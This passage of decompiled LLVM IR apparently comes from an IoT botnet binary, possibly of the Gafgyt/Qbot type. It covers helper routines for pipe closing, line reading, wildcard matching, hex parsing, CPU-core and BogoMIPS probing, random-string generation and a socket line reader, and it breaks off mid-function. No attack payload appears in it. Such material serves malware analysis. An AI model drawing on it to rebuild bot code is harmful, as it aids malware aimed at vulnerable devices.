  uselistorder label %dec_label_pc_8ffc, { 1, 0 }
  uselistorder label %dec_label_pc_8ff0, { 1, 0 }
  uselistorder label %dec_label_pc_8fb8, { 1, 0 }
  uselistorder label %dec_label_pc_8f2c, { 1, 0 }
  uselistorder label %dec_label_pc_8e68, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_90a4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_90a4, i32* @ip, align 4
  %v2_90bc = load i32, i32* @global_var_2f5e8.38, align 4
  %v2_90c0 = icmp eq i32 %v2_90bc, 0
  br i1 %v2_90c0, label %dec_label_pc_9214, label %dec_label_pc_90c8

dec_label_pc_90c8:                                ; preds = %entry
  %v3_90cc = mul i32 %arg1, 4
  %v2_90dc = add i32 %v2_90bc, %v3_90cc
  %v1_90e0 = inttoptr i32 %v2_90dc to i32*
  %v2_90e0 = load i32, i32* %v1_90e0, align 4
  %v2_90e4 = icmp eq i32 %v2_90e0, 0
  br i1 %v2_90e4, label %dec_label_pc_9214, label %dec_label_pc_90f8

dec_label_pc_90f8:                                ; preds = %dec_label_pc_90c8
  %v1_90fc = call i32 @__libc_close(i32 %arg1)
  %v2_9100 = ptrtoint i32* %stack_var_-276 to i32
  store i32 %v2_9100, i32* @r0, align 4
  %v1_9108 = call i32 @sigemptyset(i32 %v2_9100)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9118 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 2)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9128 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 3)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9138 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 1)
  %v2_9140 = ptrtoint i32* %stack_var_-148 to i32
  %v3_914c = bitcast i32* %stack_var_-276 to %_TYPEDEF_sigset_t*
  %v4_914c = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_914c, i32 %v2_9140)
  %v2_916c = ptrtoint i32* %stack_var_-280 to i32
  br label %dec_label_pc_9150

dec_label_pc_9150:                                ; preds = %dec_label_pc_9194, %dec_label_pc_90f8
  %v2_9160 = load i32, i32* @global_var_2f5e8.38, align 4
  %v2_9164 = add i32 %v2_9160, %v3_90cc
  %v1_9168 = inttoptr i32 %v2_9164 to i32*
  %v2_9168 = load i32, i32* %v1_9168, align 4
  %v3_917c = call i32 @__libc_waitpid(i32 %v2_9168, i32 %v2_916c, i32 0)
  %v3_918c = icmp eq i32 %v3_917c, -1
  %v8_918c = icmp eq i32 %v3_917c, -1
  br i1 %v3_918c, label %dec_label_pc_9194, label %dec_label_pc_91a8

dec_label_pc_9194:                                ; preds = %dec_label_pc_9150
  %v0_9194 = call i32 @__errno_location()
  %v1_919c = inttoptr i32 %v0_9194 to i32*
  %v2_919c = load i32, i32* %v1_919c, align 4
  %v7_91a0 = icmp eq i32 %v2_919c, 4
  br i1 %v7_91a0, label %dec_label_pc_9150, label %dec_label_pc_91a8

dec_label_pc_91a8:                                ; preds = %dec_label_pc_9150, %dec_label_pc_9194
  %v3_91b8 = bitcast i32* %stack_var_-148 to %_TYPEDEF_sigset_t*
  %v4_91b8 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_91b8, i32 0)
  %v3_91c0 = mul i32 %tmp6, 4
  %v2_91cc = load i32, i32* @global_var_2f5e8.38, align 4
  %v2_91d0 = add i32 %v2_91cc, %v3_91c0
  %v2_91d8 = inttoptr i32 %v2_91d0 to i32*
  store i32 0, i32* %v2_91d8, align 4
  br i1 %v8_918c, label %dec_label_pc_9214, label %dec_label_pc_91e8

dec_label_pc_91e8:                                ; preds = %dec_label_pc_91a8
  %v3_91e8 = load i32, i32* %stack_var_-280, align 4
  %v1_91f4 = and i32 %v3_91e8, 65280
  %v3_91f81 = udiv i32 %v1_91f4, 256
  br label %dec_label_pc_9214

dec_label_pc_9214:                                ; preds = %dec_label_pc_91e8, %dec_label_pc_91a8, %entry, %dec_label_pc_90c8
  %storemerge4 = phi i32 [ -1, %dec_label_pc_90c8 ], [ -1, %entry ], [ %v3_91f81, %dec_label_pc_91e8 ], [ -1, %dec_label_pc_91a8 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v2_9100, { 1, 0, 3, 2, 5, 4, 7, 6 }
  uselistorder i32 %v3_90cc, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32* @global_var_2f5e8.38, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9214, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_91a8, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_9228 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_9228, i32* @ip, align 4
  br label %dec_label_pc_9298

dec_label_pc_9258:                                ; preds = %dec_label_pc_92a8
  store i32 %v2_92b4, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_9274 = call i32 @__libc_read(i32 %arg3)
  %v1_9284 = add nuw i32 %storemerge25, 1
  %v7_9290 = icmp eq i32 %v1_9274, 1
  br i1 %v7_9290, label %dec_label_pc_9298, label %dec_label_pc_92c8

dec_label_pc_9298:                                ; preds = %entry, %dec_label_pc_9258
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_9284, %dec_label_pc_9258 ]
  %v6_92a4 = icmp slt i32 %storemerge25, %arg2
  br i1 %v6_92a4, label %dec_label_pc_92a8, label %dec_label_pc_92c8

dec_label_pc_92a8:                                ; preds = %dec_label_pc_9298
  %v2_92b4 = add i32 %storemerge25, %arg1
  %v1_92b8 = add i32 %v2_92b4, -1
  %v1_92bc = inttoptr i32 %v1_92b8 to i8*
  %v2_92bc = load i8, i8* %v1_92bc, align 1
  %v7_92c0 = icmp eq i8 %v2_92bc, 10
  br i1 %v7_92c0, label %dec_label_pc_92c8, label %dec_label_pc_9258

dec_label_pc_92c8:                                ; preds = %dec_label_pc_92a8, %dec_label_pc_9298, %dec_label_pc_9258
  %stack_var_-24.0.lcssa = phi i32 [ 1, %dec_label_pc_92a8 ], [ 1, %dec_label_pc_9298 ], [ %v1_9274, %dec_label_pc_9258 ]
  %v2_92cc = icmp eq i32 %stack_var_-24.0.lcssa, 0
  %storemerge3 = select i1 %v2_92cc, i32 0, i32 %arg1
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v2_92b4, { 1, 0 }
  uselistorder i32 %v1_9274, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9298, { 1, 0 }
}

define i32 @parseHex(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_934c4 = load i8, i8* %arg1, align 1
  %v2_93506 = icmp eq i8 %v2_934c4, 0
  br i1 %v2_93506, label %dec_label_pc_9364, label %dec_label_pc_9358

dec_label_pc_9318:                                ; preds = %dec_label_pc_9358
  %v3_931c = mul i32 %stack_var_-20.07, 16
  %v4_9320 = ptrtoint i8* %v3_933c to i32
  %v2_9324 = load i8, i8* %v3_933c, align 1
  %v3_9324 = zext i8 %v2_9324 to i32
  %v4_9330 = mul nuw nsw i32 %v3_9324, 4
  %v5_9330 = add i32 %v4_9330, ptrtoint (i32* @global_var_1ce1c.47 to i32)
  %v6_9330 = inttoptr i32 %v5_9330 to i32*
  %v7_9330 = load i32, i32* %v6_9330, align 4
  %v2_9334 = or i32 %v7_9330, %v3_931c
  %v1_9340 = add i32 %v4_9320, 1
  %v5_9344 = inttoptr i32 %v1_9340 to i8*
  %v2_934c = load i8, i8* %v5_9344, align 1
  %v2_9350 = icmp eq i8 %v2_934c, 0
  br i1 %v2_9350, label %dec_label_pc_9364, label %dec_label_pc_9358

dec_label_pc_9358:                                ; preds = %entry, %dec_label_pc_9318
  %v3_933c = phi i8* [ %v5_9344, %dec_label_pc_9318 ], [ %arg1, %entry ]
  %stack_var_-20.07 = phi i32 [ %v2_9334, %dec_label_pc_9318 ], [ 0, %entry ]
  %v1_935c = icmp slt i32 %stack_var_-20.07, 0
  br i1 %v1_935c, label %dec_label_pc_9364, label %dec_label_pc_9318

dec_label_pc_9364:                                ; preds = %dec_label_pc_9318, %dec_label_pc_9358, %entry
  %stack_var_-20.0.lcssa = phi i32 [ 0, %entry ], [ %v2_9334, %dec_label_pc_9318 ], [ %stack_var_-20.07, %dec_label_pc_9358 ]
  ret i32 %stack_var_-20.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-20.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_9364, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9358, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp9 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_937c = load i32, i32* @r4, align 4
  %v6_937c = load i32, i32* @fp, align 4
  store i32 37764, i32* %stack_var_-4, align 4
  %v2_9380 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9380, i32* @fp, align 4
  %v2_9394 = load i8, i8* %arg1, align 1
  %v7_93a0 = icmp eq i8 %v2_9394, 42
  br i1 %v7_93a0, label %dec_label_pc_93d4, label %dec_label_pc_93a8

dec_label_pc_93a8:                                ; preds = %entry
  %v7_93ac = icmp eq i8 %v2_9394, 63
  br i1 %v7_93ac, label %dec_label_pc_9444, label %dec_label_pc_93b4

dec_label_pc_93b4:                                ; preds = %dec_label_pc_93a8
  %v2_93b8 = icmp eq i8 %v2_9394, 0
  br i1 %v2_93b8, label %dec_label_pc_93c4, label %dec_label_pc_949c

dec_label_pc_93c4:                                ; preds = %dec_label_pc_93b4
  %v2_93c8 = load i8, i8* %tmp, align 1
  %v3_93c8 = zext i8 %v2_93c8 to i32
  br label %dec_label_pc_9510

dec_label_pc_93d4:                                ; preds = %entry
  %v1_93d8 = add i32 %tmp9, 1
  %v3_93e4 = inttoptr i32 %v1_93d8 to i8*
  %v4_93e4 = call i32 @wildString(i8* %v3_93e4, i32 %arg2)
  %v2_93ec = icmp eq i32 %v4_93e4, 0
  br i1 %v2_93ec, label %dec_label_pc_9430, label %dec_label_pc_93f4

dec_label_pc_93f4:                                ; preds = %dec_label_pc_93d4
  %v2_93f8 = load i8, i8* %tmp, align 1
  %v2_93fc = icmp eq i8 %v2_93f8, 0
  br i1 %v2_93fc, label %dec_label_pc_9438, label %dec_label_pc_9404

dec_label_pc_9404:                                ; preds = %dec_label_pc_93f4
  %v1_9408 = add i32 %arg2, 1
  %v4_9414 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_9408)
  %v2_941c = icmp eq i32 %v4_9414, 0
  br i1 %v2_941c, label %dec_label_pc_9430, label %dec_label_pc_9438

dec_label_pc_9430:                                ; preds = %dec_label_pc_9404, %dec_label_pc_93d4
  br label %dec_label_pc_9438

dec_label_pc_9438:                                ; preds = %dec_label_pc_93f4, %dec_label_pc_9404, %dec_label_pc_9430
  %storemerge4 = phi i32 [ 0, %dec_label_pc_9430 ], [ 1, %dec_label_pc_9404 ], [ 1, %dec_label_pc_93f4 ]
  br label %dec_label_pc_9510

dec_label_pc_9444:                                ; preds = %dec_label_pc_93a8
  %v2_9448 = load i8, i8* %tmp, align 1
  %v2_944c = icmp eq i8 %v2_9448, 0
  br i1 %v2_944c, label %dec_label_pc_9490, label %dec_label_pc_9454

dec_label_pc_9454:                                ; preds = %dec_label_pc_9444
  %v1_9458 = add i32 %tmp9, 1
  %v1_9460 = add i32 %arg2, 1
  %v2_946c = inttoptr i32 %v1_9458 to i8*
  %v3_946c = call i32 @wildString(i8* %v2_946c, i32 %v1_9460)
  %v2_9474 = icmp ne i32 %v3_946c, 0
  %. = zext i1 %v2_9474 to i32
  br label %dec_label_pc_9490

dec_label_pc_9490:                                ; preds = %dec_label_pc_9454, %dec_label_pc_9444
  %storemerge3 = phi i32 [ 1, %dec_label_pc_9444 ], [ %., %dec_label_pc_9454 ]
  br label %dec_label_pc_9510

dec_label_pc_949c:                                ; preds = %dec_label_pc_93b4
  %v2_94a0 = load i8, i8* %arg1, align 1
  %v3_94a0 = zext i8 %v2_94a0 to i32
  %v1_94a8 = call i32 @__GI_toupper(i32 %v3_94a0)
  store i32 %v1_94a8, i32* @r4, align 4
  %v2_94b4 = load i8, i8* %tmp, align 1
  %v3_94b4 = zext i8 %v2_94b4 to i32
  %v1_94bc = call i32 @__GI_toupper(i32 %v3_94b4)
  %v0_94c4 = load i32, i32* @r4, align 4
  %v9_94c4 = icmp eq i32 %v0_94c4, %v1_94bc
  br i1 %v9_94c4, label %dec_label_pc_94cc, label %dec_label_pc_9508

dec_label_pc_94cc:                                ; preds = %dec_label_pc_949c
  %v1_94d0 = add i32 %tmp9, 1
  %v1_94d8 = add i32 %arg2, 1
  %v2_94e4 = inttoptr i32 %v1_94d0 to i8*
  %v3_94e4 = call i32 @wildString(i8* %v2_94e4, i32 %v1_94d8)
  %v2_94ec = icmp ne i32 %v3_94e4, 0
  %.8 = zext i1 %v2_94ec to i32
  br label %dec_label_pc_9508

dec_label_pc_9508:                                ; preds = %dec_label_pc_94cc, %dec_label_pc_949c
  %storemerge = phi i32 [ 1, %dec_label_pc_949c ], [ %.8, %dec_label_pc_94cc ]
  br label %dec_label_pc_9510

dec_label_pc_9510:                                ; preds = %dec_label_pc_9490, %dec_label_pc_9438, %dec_label_pc_93c4, %dec_label_pc_9508
  %stack_var_-44.0 = phi i32 [ %storemerge4, %dec_label_pc_9438 ], [ %storemerge3, %dec_label_pc_9490 ], [ %v3_93c8, %dec_label_pc_93c4 ], [ %storemerge, %dec_label_pc_9508 ]
  store i32 %v3_937c, i32* @r4, align 4
  store i32 %v6_937c, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_9510, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_9438, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_9540 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_9540, i32* %arg2, align 4
  %v3_9558 = icmp eq i32 %v1_9540, -1
  %. = zext i1 %v3_9558 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i8*, align 4
  %v0_9594 = load i32, i32* %r0.global-to-local, align 4
  %storemerge2 = inttoptr i32 %v0_9594 to i8*
  store i8* %storemerge2, i8** %stack_var_-20, align 4
  %v2_95cc3 = load i8, i8* %storemerge2, align 1
  %v2_95d05 = icmp eq i8 %v2_95cc3, 0
  br i1 %v2_95d05, label %dec_label_pc_95d8, label %dec_label_pc_959c

dec_label_pc_959c:                                ; preds = %entry, %dec_label_pc_959c
  %v2_95d88 = phi i8* [ %storemerge, %dec_label_pc_959c ], [ %storemerge2, %entry ]
  %v2_95a0 = load i8, i8* %v2_95d88, align 1
  %v3_95a0 = zext i8 %v2_95a0 to i32
  store i32 %v3_95a0, i32* %r0.global-to-local, align 4
  %v1_95a8 = call i32 @__GI_toupper(i32 %v3_95a0)
  store i32 %v1_95a8, i32* %r0.global-to-local, align 4
  %v3_95b4 = load i8*, i8** %stack_var_-20, align 4
  %v1_95b8 = trunc i32 %v1_95a8 to i8
  store i8 %v1_95b8, i8* %v3_95b4, align 1
  %v4_95bc = ptrtoint i8* %v3_95b4 to i32
  %v1_95c0 = add i32 %v4_95bc, 1
  %storemerge = inttoptr i32 %v1_95c0 to i8*
  store i8* %storemerge, i8** %stack_var_-20, align 4
  %v2_95cc = load i8, i8* %storemerge, align 1
  %v2_95d0 = icmp eq i8 %v2_95cc, 0
  br i1 %v2_95d0, label %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge, label %dec_label_pc_959c

dec_label_pc_95c8.dec_label_pc_95d8_crit_edge:    ; preds = %dec_label_pc_959c
  %v13_95d8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_95d8

dec_label_pc_95d8:                                ; preds = %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge, %entry
  %v13_95d8 = phi i32 [ %v13_95d8.pre, %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge ], [ %v0_9594, %entry ]
  ret i32 %v13_95d8

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 2, 0 }
  uselistorder i8** %stack_var_-20, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_959c, { 1, 0 }
}

define i32 @getBogos(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-4112 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_95e0 = load i32, i32* @fp, align 4
  store i32 %v3_95e0, i32* %stack_var_-16, align 4
  %v13_95e0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v13_95e0, i32* @r2, align 4
  %v4_9608 = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1d21c.49, i32 0, i32 0), i32 0)
  %v2_97cc = ptrtoint i32* %stack_var_-4120 to i32
  %v1_9628 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_97c4

dec_label_pc_9618:                                ; preds = %dec_label_pc_97c4
  %v2_9628 = call i32 @uppercase(i8* %v1_9628)
  %v4_9640 = call i32 @strstr(i32 %v2_97cc, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1d22c.51, i32 0, i32 0))
  %v9_9658 = icmp eq i32 %v4_9640, %v2_97cc
  br i1 %v9_9658, label %dec_label_pc_9660, label %dec_label_pc_97a8

dec_label_pc_9660:                                ; preds = %dec_label_pc_9618
  %tmp18 = bitcast i32* %stack_var_-4112 to i8*
  br label %dec_label_pc_9684

dec_label_pc_9678:                                ; preds = %dec_label_pc_96a4, %dec_label_pc_9694, %dec_label_pc_9684
  %v1_967c = add i32 %v4_9684, 1
  %v5_9680 = inttoptr i32 %v1_967c to i8*
  br label %dec_label_pc_9684

dec_label_pc_9684:                                ; preds = %dec_label_pc_9660, %dec_label_pc_9678
  %storemerge2 = phi i8* [ %v5_9680, %dec_label_pc_9678 ], [ %tmp18, %dec_label_pc_9660 ]
  %v4_9684 = ptrtoint i8* %storemerge2 to i32
  %v2_9688 = load i8, i8* %storemerge2, align 1
  %v7_968c = icmp eq i8 %v2_9688, 32
  br i1 %v7_968c, label %dec_label_pc_9678, label %dec_label_pc_9694

dec_label_pc_9694:                                ; preds = %dec_label_pc_9684
  %v2_9698 = load i8, i8* %storemerge2, align 1
  %v7_969c = icmp eq i8 %v2_9698, 9
  br i1 %v7_969c, label %dec_label_pc_9678, label %dec_label_pc_96a4

dec_label_pc_96a4:                                ; preds = %dec_label_pc_9694
  %v2_96a8 = load i8, i8* %storemerge2, align 1
  %v7_96ac = icmp eq i8 %v2_96a8, 58
  br i1 %v7_96ac, label %dec_label_pc_9678, label %dec_label_pc_96e0.preheader

dec_label_pc_96e0.preheader:                      ; preds = %dec_label_pc_96a4
  %v2_96f8 = add i32 %v4_9684, -1
  br label %dec_label_pc_96e0

dec_label_pc_96b8:                                ; preds = %dec_label_pc_96e0, %dec_label_pc_970c
  %v3_96c0 = call i32 @strlen(i8* %storemerge2)
  %v1_96d4 = add i32 %v2_96f8, %v3_96c0
  %v3_96dc = inttoptr i32 %v1_96d4 to i8*
  store i8 0, i8* %v3_96dc, align 1
  br label %dec_label_pc_96e0

dec_label_pc_96e0:                                ; preds = %dec_label_pc_96e0.preheader, %dec_label_pc_96b8
  %v3_96e8 = call i32 @strlen(i8* %storemerge2)
  %v1_96fc = add i32 %v3_96e8, %v2_96f8
  %v1_9700 = inttoptr i32 %v1_96fc to i8*
  %v2_9700 = load i8, i8* %v1_9700, align 1
  %v7_9704 = icmp eq i8 %v2_9700, 13
  br i1 %v7_9704, label %dec_label_pc_96b8, label %dec_label_pc_970c

dec_label_pc_970c:                                ; preds = %dec_label_pc_96e0
  %v3_9714 = call i32 @strlen(i8* %storemerge2)
  %v1_9728 = add i32 %v3_9714, %v2_96f8
  %v1_972c = inttoptr i32 %v1_9728 to i8*
  %v2_972c = load i8, i8* %v1_972c, align 1
  %v7_9730 = icmp eq i8 %v2_972c, 10
  br i1 %v7_9730, label %dec_label_pc_96b8, label %dec_label_pc_9738

dec_label_pc_9738:                                ; preds = %dec_label_pc_970c
  %v2_9744 = call i32 @__GI_strchr(i32 %v4_9684, i32 46)
  %v2_974c = icmp eq i32 %v2_9744, 0
  br i1 %v2_974c, label %dec_label_pc_9770, label %dec_label_pc_9754

dec_label_pc_9754:                                ; preds = %dec_label_pc_9738
  %v2_9760 = call i32 @__GI_strchr(i32 %v4_9684, i32 46)
  %v3_976c = inttoptr i32 %v2_9760 to i8*
  store i8 0, i8* %v3_976c, align 1
  br label %dec_label_pc_9770

dec_label_pc_9770:                                ; preds = %dec_label_pc_9738, %dec_label_pc_9754
  %v3_978c = call i32 @strcpy(i32 %arg1, i8* %storemerge2)
  %v1_9794 = call i32 @__libc_close(i32 %v4_9608)
  br label %dec_label_pc_9800

dec_label_pc_97a8:                                ; preds = %dec_label_pc_9618
  store i32 4096, i32* @r2, align 4
  %v3_97c0 = call i32 @__GI_memset(i8* %v1_9628, i32 0)
  br label %dec_label_pc_97c4

dec_label_pc_97c4:                                ; preds = %entry, %dec_label_pc_97a8
  %v4_97dc = call i32 @fdgets(i32 %v2_97cc, i32 4096, i32 %v4_9608, i32 %v2_97cc)
  %v2_97e4 = icmp eq i32 %v4_97dc, 0
  br i1 %v2_97e4, label %dec_label_pc_97ec, label %dec_label_pc_9618

dec_label_pc_97ec:                                ; preds = %dec_label_pc_97c4
  %v1_97f0 = call i32 @__libc_close(i32 %v4_9608)
  br label %dec_label_pc_9800

dec_label_pc_9800:                                ; preds = %dec_label_pc_9770, %dec_label_pc_97ec
  %storemerge4 = phi i32 [ 1, %dec_label_pc_97ec ], [ 0, %dec_label_pc_9770 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v2_96f8, { 1, 2, 0 }
  uselistorder i8* %storemerge2, { 0, 1, 3, 2, 4, 5, 7, 6 }
  uselistorder i32 %v2_97cc, { 0, 3, 1, 2 }
  uselistorder i32 %v4_9608, { 1, 2, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder label %dec_label_pc_9800, { 1, 0 }
  uselistorder label %dec_label_pc_97c4, { 1, 0 }
  uselistorder label %dec_label_pc_9770, { 1, 0 }
  uselistorder label %dec_label_pc_96e0, { 1, 0 }
  uselistorder label %dec_label_pc_96b8, { 1, 0 }
  uselistorder label %dec_label_pc_9684, { 1, 0 }
}

define i32 @getCores(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  %stack_var_-4120 = alloca i32, align 4
  %v2_982c = ptrtoint i32* %stack_var_-4120 to i32
  %v4_9840 = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1d21c.49, i32 0, i32 0), i32 0)
  %v1_9860 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_98bc

dec_label_pc_9850:                                ; preds = %dec_label_pc_98bc
  %v2_9860 = call i32 @uppercase(i8* %v1_9860)
  %v4_9878 = call i32 @strstr(i32 %v2_982c, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1d22c.51, i32 0, i32 0))
  %v9_988c = icmp eq i32 %v4_9878, %v2_982c
  br i1 %v9_988c, label %dec_label_pc_9894, label %dec_label_pc_98a0

dec_label_pc_9894:                                ; preds = %dec_label_pc_9850
  %v1_9898 = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_98a0

dec_label_pc_98a0:                                ; preds = %dec_label_pc_9850, %dec_label_pc_9894
  %stack_var_-24.0 = phi i32 [ %v1_9898, %dec_label_pc_9894 ], [ %stack_var_-24.1, %dec_label_pc_9850 ]
  store i32 4096, i32* @r2, align 4
  %v3_98b8 = call i32 @__GI_memset(i8* %v1_9860, i32 0)
  br label %dec_label_pc_98bc

dec_label_pc_98bc:                                ; preds = %entry, %dec_label_pc_98a0
  %stack_var_-24.1 = phi i32 [ 0, %entry ], [ %stack_var_-24.0, %dec_label_pc_98a0 ]
  %v4_98d4 = call i32 @fdgets(i32 %v2_982c, i32 4096, i32 %v4_9840, i32 %v2_982c)
  %v2_98dc = icmp eq i32 %v4_98d4, 0
  br i1 %v2_98dc, label %dec_label_pc_98e4, label %dec_label_pc_9850

dec_label_pc_98e4:                                ; preds = %dec_label_pc_98bc
  %v1_98e8 = call i32 @__libc_close(i32 %v4_9840)
  ret i32 %stack_var_-24.1

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 0, 2, 1 }
  uselistorder i32 %v2_982c, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_98bc, { 1, 0 }
  uselistorder label %dec_label_pc_98a0, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_9908 = load i32, i32* @r4, align 4
  %v6_9908 = load i32, i32* @fp, align 4
  %v0_9914 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-32, align 4
  %v5_998017 = icmp sgt i32 %arg2, 0
  br i1 %v5_998017, label %dec_label_pc_9930, label %dec_label_pc_9984

dec_label_pc_9930:                                ; preds = %entry, %dec_label_pc_9930
  %storemerge118 = phi i32 [ %v1_996c, %dec_label_pc_9930 ], [ 0, %entry ]
  %v2_993c = add i32 %storemerge118, %v0_9914
  store i32 %v2_993c, i32* @r4, align 4
  %v0_9940 = call i32 @rand_cmwc()
  %v2_9950 = urem i32 %v0_9940, 26
  store i32 %v2_9950, i32* %r0.global-to-local, align 4
  %v1_995c = add nuw nsw i32 %v2_9950, 65
  %v1_9964 = trunc i32 %v1_995c to i8
  %v2_9964 = load i32, i32* @r4, align 4
  %v3_9964 = inttoptr i32 %v2_9964 to i8*
  store i8 %v1_9964, i8* %v3_9964, align 1
  %v1_996c = add i32 %storemerge118, 1
  %v3_9978.pre = load i32, i32* %stack_var_-32, align 4
  %v5_9980 = icmp slt i32 %v1_996c, %v3_9978.pre
  br i1 %v5_9980, label %dec_label_pc_9930, label %dec_label_pc_9974.dec_label_pc_9984_crit_edge

dec_label_pc_9974.dec_label_pc_9984_crit_edge:    ; preds = %dec_label_pc_9930
  %v12_9988.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9984

dec_label_pc_9984:                                ; preds = %dec_label_pc_9974.dec_label_pc_9984_crit_edge, %entry
  %v12_9988 = phi i32 [ %v12_9988.pre, %dec_label_pc_9974.dec_label_pc_9984_crit_edge ], [ %v0_9914, %entry ]
  store i32 %v3_9908, i32* @r4, align 4
  store i32 %v6_9908, i32* @fp, align 4
  ret i32 %v12_9988

; uselistorder directives
  uselistorder i32 %v1_996c, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_9930, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_99e0.lr.ph:
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9990 = load i32, i32* @fp, align 4
  store i32 %v3_9990, i32* %stack_var_-16, align 4
  store i32 39320, i32* %stack_var_-4, align 4
  %v2_9994 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9994, i32* @fp, align 4
  store i32 %arg3, i32* @r2, align 4
  %v4_99b8 = call i32 @__GI_memset(i8* %arg2, i32 0)
  store i32 30, i32* %stack_var_-184, align 4
  %v2_99cc = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_99e0

dec_label_pc_99e0:                                ; preds = %dec_label_pc_99e0.lr.ph, %dec_label_pc_99e0
  %storemerge527 = phi i32 [ 0, %dec_label_pc_99e0.lr.ph ], [ %v1_99f4, %dec_label_pc_99e0 ]
  %v5_99ec = mul nuw nsw i32 %storemerge527, 4
  %v6_99ec = add i32 %v5_99ec, %v2_99cc
  %v7_99ec = inttoptr i32 %v6_99ec to i32*
  store i32 0, i32* %v7_99ec, align 4
  %v1_99f4 = add nuw nsw i32 %storemerge527, 1
  %tmp52 = icmp ult i32 %v1_99f4, 32
  br i1 %tmp52, label %dec_label_pc_99e0, label %dec_label_pc_9a08

